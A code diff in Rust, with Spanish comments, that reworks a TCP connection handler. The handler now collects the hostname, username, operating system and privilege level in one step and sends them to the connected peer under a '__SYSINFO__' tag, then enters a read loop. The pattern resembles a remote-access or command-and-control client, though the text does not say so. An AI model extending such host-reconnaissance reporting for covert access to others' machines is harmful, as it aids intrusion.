@@ -33,10 +33,8 @@ fn handle_connection(stream: TcpStream) {
     let mut reader = BufReader::new(stream.try_clone().unwrap());
     let mut writer = stream;
 
-    let stream_clone = writer.try_clone().unwrap();
-    thread::spawn(move || {
-        send_sysinfo(stream_clone);
-    });
+    // Enviar información del sistema de una vez (blocking)
+    send_sysinfo(&mut writer);
 
     let mut buffer = String::new();
     loop {
@@ -62,15 +60,25 @@ fn handle_connection(stream: TcpStream) {
     }
 }
 
-fn send_sysinfo(mut stream: TcpStream) {
-    let info_types = ["hostname", "username", "os", "privileges"];
-    for info_type in &info_types {
-        let value = get_system_info(info_type);
-        let message = format!("__SYSINFO__:{}:{}\n", info_type, value);
-        stream.write_all(message.as_bytes()).ok();
-        stream.flush().ok();
-        thread::sleep(Duration::from_secs(10));
-    }
+fn send_sysinfo(writer: &mut TcpStream) {
+    println!("DEBUG: Recopilando información del sistema...");
+    
+    // Recopilar toda la información de una vez
+    let hostname = get_system_info("hostname");
+    let username = get_system_info("username");
+    let os = get_system_info("os");
+    let privileges = get_system_info("privileges");
+    
+    // Enviar todo de una vez
+    let sysinfo = format!(
+        "__SYSINFO__:hostname:{}\n__SYSINFO__:username:{}\n__SYSINFO__:os:{}\n__SYSINFO__:privileges:{}\n",
+        hostname, username, os, privileges
+    );
+    
+    println!("DEBUG: Enviando información del sistema...");
+    writer.write_all(sysinfo.as_bytes()).ok();
+    writer.flush().ok();
+    println!("DEBUG: Información enviada");
 }
 
 fn get_system_info(info_type: &str) -> String {
